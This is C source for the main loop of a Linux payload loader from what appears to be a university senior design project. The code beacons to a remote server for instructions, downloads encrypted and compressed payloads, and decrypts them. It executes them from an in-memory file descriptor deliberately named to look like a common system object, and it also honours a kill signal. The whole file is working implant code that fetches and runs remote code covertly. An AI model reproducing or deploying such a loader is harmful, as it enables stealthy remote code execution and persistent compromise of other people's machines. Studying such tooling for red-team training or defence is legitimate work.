/**
 * Linux Loader main code for Lockheed Martin Packer/Loader II project, Senior Design Fall 2020 / Spring 2021.
 * 
 * Authors: Robert Weiner, James Cogswell, Elitania Venturella
 */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include "detect.h"
#include "helpers.h"
#include "networking.h"
#include "preferences.h"

int main()
{
    struct MemoryStruct payload;
    void *decrypted;
    void *decompressed;
    PayloadStruct *payloadMeta; // holds the sizes of each payload
    unsigned char *payloadOffset; // hold offset from payload base addr for addressing
    unsigned int numBlobs;
    int payloadFD;       // in memory file descriptor
    int writeReturnSize;
    int d;                               //to hold the return value of detect()
    pid_t child;
    unsigned char *psswd;
    int numFiles = 0;
    char currFileName[strlen(PATH_TO_WRITE) + 5];
    char *formattedURL;
    char **payloadNames;
    char *currLine;
    char **currLines;
    size_t numPayloads;
    size_t numLines;
    size_t currLineNum = 0;
    int beaconCount = 0;
    
    char *uid = genUID();
    if (uid == NULL)
        return -1;

    // password padding
    psswd = psswdPadding(psswd);
    if (psswd == NULL)
    {
        free(uid);
        return -1;
    }

    while(1)
    {
        formattedURL = formatURL("instructions", uid);
        if (formattedURL == NULL)
        {
            free(uid);
            free(psswd);
            return -1;
        }
        if (beaconCount == 0)
        {
            payload = beacon(formattedURL, 1);
        }
        else
        {
            payload = beacon(formattedURL, 2);
        }
        if ( payload.memory == NULL)
        {
            free(uid);
            free(formattedURL);
            free(psswd);
            return -1;
        }
        payloadOffset = (unsigned char *)payload.memory;
        payloadMeta = parseMeta(&payloadOffset);

        decrypted = (void *)decrypt((unsigned char *)payloadOffset, payloadMeta[0].encryptedLength, payloadMeta[0].decryptedLength, psswd);
        decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)payloadMeta[0].uncompressedLength, payloadMeta[0].decryptedLength);
        
        numLines = countLines(decompressed);
        if (numLines <= currLineNum)
        {
            free(decompressed);
            free(payload.memory);
            free(formattedURL);
            freePayloadMeta(payloadMeta);
            continue;
        }
        currLines = parsePayloads(decompressed, numLines, ";");
        currLine = currLines[currLineNum];

        free(decompressed);
        free(payload.memory);
        free(formattedURL);
        freePayloadMeta(payloadMeta);

        numPayloads = countPayloads(currLine);
        payloadNames = parsePayloads(currLine, numPayloads, " ");

        if (!strcmp(payloadNames[0], "reset"))
        {
            currLineNum = 0;
            freePayloads(payloadNames, numPayloads);
            freePayloads(currLines, numLines);
            continue;
        }

        for (int j = 0; j < numPayloads; j++)
        {
            //loop for every payload to get in payloadNames
            formattedURL = formatURL(payloadNames[j], uid);
            if (formattedURL == NULL)
            {
                freePayloads(currLines, numLines);
                freePayloads(payloadNames, numPayloads);
                free(formattedURL);
                free(uid);
                return -1;
            }

            payload = beacon(formattedURL, 0);
            if (payload.memory == NULL)
            {
                freePayloads(currLines, numLines);
                freePayloads(payloadNames, numPayloads);
                free(formattedURL);
                free(uid);
                return -1;
            }

            payloadOffset = (unsigned char *)payload.memory; // hold for iteration
            numBlobs = extractInt(payloadOffset);

            payloadMeta = parseMeta(&payloadOffset); // extract all metadata
            if (payloadMeta == NULL)
            {
                freePayloads(currLines, numLines);
                freePayloads(payloadNames, numPayloads);
                free(payload.memory);
                free(formattedURL);
                free(uid);
                return -1;
            }

            for (int i = 0; i < numBlobs; i++)
            { // main loop to deploy payloads

                decrypted = (void *)decrypt((unsigned char *)payloadOffset, payloadMeta[i].encryptedLength, payloadMeta[i].decryptedLength, psswd);
                if (decrypted == NULL)
                {
                    freePayloads(currLines, numLines);
                    freePayloads(payloadNames, numPayloads);
                    freePayloadMeta(payloadMeta);
                    free(payload.memory);
                    free(formattedURL);
                    free(psswd);
                    free(uid);
                    return -1;
                }

                decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)payloadMeta[i].uncompressedLength, (uLong)payloadMeta[i].decryptedLength);

                if ((payloadMeta[i].uncompressedLength == 64) && (checkKill(decompressed) == 1))
                {
                    freePayloads(currLines, numLines);
                    freePayloads(payloadNames, numPayloads);
                    freePayloadMeta(payloadMeta);
                    free(payload.memory);
                    free(formattedURL);
                    free(psswd);
                    free(decompressed);
                    free(uid);
                    return -1;
                }

                while ((payloadFD = memfd_create("xshmfence", 0)) <= 2) // name as such due to this fd name appearing often on linux
                {                                                       // create memory file descriptor for execution
                    close(payloadFD);
                    //return -1;
                }

                writeReturnSize = write(payloadFD, decompressed, payloadMeta[i].uncompressedLength); // write to mem_fd and error check
                if (writeReturnSize != payloadMeta[i].uncompressedLength)
                {
                    freePayloads(currLines, numLines);
                    freePayloads(payloadNames, numPayloads);
                    freePayloadMeta(payloadMeta);
                    free(payload.memory);
                    free(formattedURL);
                    free(psswd);
                    free(decompressed);
                    free(uid);
                    return -1;
                }
                
                if (payloadMeta[i].flags & 0x4){
                    sprintf(currFileName, "%s%d", PATH_TO_WRITE, numFiles);
                    writeToDisk(decompressed, currFileName, payloadMeta[i].uncompressedLength);
                    numFiles++;
                }

                else
                {
                    d = detect((unsigned char *)decompressed); //determine if the payload is an executable/ELF

                    if (d == 1)
                    {
                        if ((child = fork()) == 0)
                        {
                            if (executePayload(payloadFD, payloadMeta[i].argv, payloadMeta[i].envp) == 0) // execute within child
                            {
                                //send message to operator
                                freePayloads(currLines, numLines);
                                freePayloads(payloadNames, numPayloads);
                                freePayloadMeta(payloadMeta);
                                free(payload.memory);
                                free(formattedURL);
                                free(psswd);
                                free(decompressed);
                                free(uid);
                                return -1;
                            }
                        }
                        else
                        {
                            if (payloadMeta[i].flags & 0x1)
                                wait(&child); // wait for child to finish within parent
                        }
                    }
                    else
                    {
                        if (payloadMeta[i].flags & 0x2){
                            sprintf(currFileName, "%s%d", PATH_TO_WRITE, numFiles);
                            writeToDisk(decompressed, currFileName, payloadMeta[i].uncompressedLength);
                            numFiles++;
                        }
                    }
                }
                free(decompressed);
                payloadOffset += payloadMeta[i].encryptedLength; // increment offset to point at next payload
            }
            free(payload.memory);
            freePayloadMeta(payloadMeta);
            free(formattedURL);
        }
        currLineNum++;
        beaconCount++;
        freePayloads(currLines, numLines);
        freePayloads(payloadNames, numPayloads);
    }
    free(uid);
    return 0;
}